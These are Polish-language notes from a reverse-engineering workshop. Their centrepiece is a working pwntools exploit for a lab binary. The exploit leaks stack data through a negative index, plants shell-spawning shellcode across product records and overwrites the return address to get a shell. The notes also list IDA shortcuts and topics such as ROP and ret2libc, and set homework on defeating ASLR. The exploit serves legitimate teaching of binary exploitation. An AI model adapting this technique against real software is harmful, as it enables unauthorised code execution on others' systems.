
Na warsztatach było trochę powtórki asm/re (można przejrzeć wykłady z http://re.disconnect3d.pl/), no i skończyliśmy eksploita z lab1, dla wyłączonego ASLR ([jak wyłączyć ASLR](http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization)):

```python
from pwn import *
 
context(arch='i386',os='linux')
shellcode = asm(shellcraft.sh())
# zamiast asm('nop') moze byc rownie dobrze 'a'
# (chcemy zeby dlugosc shellcode byla rowna 6*12)
shellcode += asm('nop') * (6*12 - len(shellcode))

buf_addr = 0xffffd63c # bez aslr mozna zaharkodowac adres...
 
p = process('./easy')
print p.proc.pid
pause()
 
print p.recvuntil('Choose: ')
 
def leak(index):
    p.sendline('3')
    p.recvuntil('view:')
    p.sendline(str(index))
    p.recvuntil('Product ID: ')
 
    leak_id = p.recvuntil(', Product Code: ')[:-16]
    leak_code = p.recvuntil('There are ').replace('There are ','')
    leak = leak_code + p32(int(leak_id) & 0xffffffff)
 
    print "[+]Leak: "+ leak.encode('hex')
    return leak
 
leak(-3)
 
def add_product(prod_id, prod_code):
    p.sendline('1') # add record
    print p.recvuntil('Enter product ID: ')
    p.sendline(prod_id)
    print p.recvuntil('Enter product code: ')
    p.sendline(prod_code)
 
for i in range(6):
    # struktura produktu
    #      8 B     |     4 B
    # product_code | product_id
    s = shellcode[i*12:i*12+12]
    product_code = s[:8]
    product_id = str(u32(s[8:]))
    add_product(product_id, product_code)

# Zadziala bez ASLR.
# Z ASLR adres bufora musimy pobrac poprzez funkcje `leak`
# (gdyz jest on na stosie, a leak wykorzystuje 'View record' z programu)
# (co pozwala nam na czytanie niektorych wartosci ze stosu, a adres bufora
# jest rowniez na stosie)
new_eip = str(buf_addr)
add_product(new_eip, 'abcdqwer')

p.sendline('4') # Quit program
# breakpoint na instrukcje `ret` w main -> b *0x08049235

p.interactive()
```

Trochę debugowaliśmy powyższy skrypt, np. żeby wstrzelić odpowiednio shellcode'a.

W tym celu podpinaliśmy się przez gdb zdalnie do procesu (`sudo gdb <binarka>; attach <pid>; <ewentualne breakpointy>; continue`).

### Powtórka skrótów Ida Pro (częściowo też Hopper):
- Typy wyświetlane czasem przez Idę: BYTE (1B), WORD (2B), DWORD (4B), QWORD (8B)
- Klawisz 'n' na symbolu - refaktoryzacja jego nazwy
- Klawisz 'x' na symbolu - szukanie xrefów
- Klawisz 'y' na symbolu - zmiana jego typu (dla zdekompilowanego kodu)
- Klawisz spacji będąc w kodzie asm - przełączanie się między widokiem grafu, a po prostu instrukcji (czasami graf nie działa)

### Omówione rzeczy:
- ROP - tu można poczytać przykład https://0xabe.io/ctf/exploit/2016/03/07/Boston-Key-Party-pwn-Simple-Calc.html
- ret2libc
- GOT, PLT
- poznawanie wersji libc na podstawie adresów

### Kolejne warsztaty - za 2 tygodnie - za tydzień jest CodeEurope.

### Zadanie domowe
- przerobić eksploita, tak, żeby działał z włączonym ASLR (hint: trzeba zrobić memory leak'a; adres bufora znajduje się gdzieś na stosie, bo został przekazany do funkcji main).
- zcrackować http://re.disconnect3d.pl/easy_crackme bez dekompilacji kodu i spróbować ręcznie odtworzyć kod programu w C
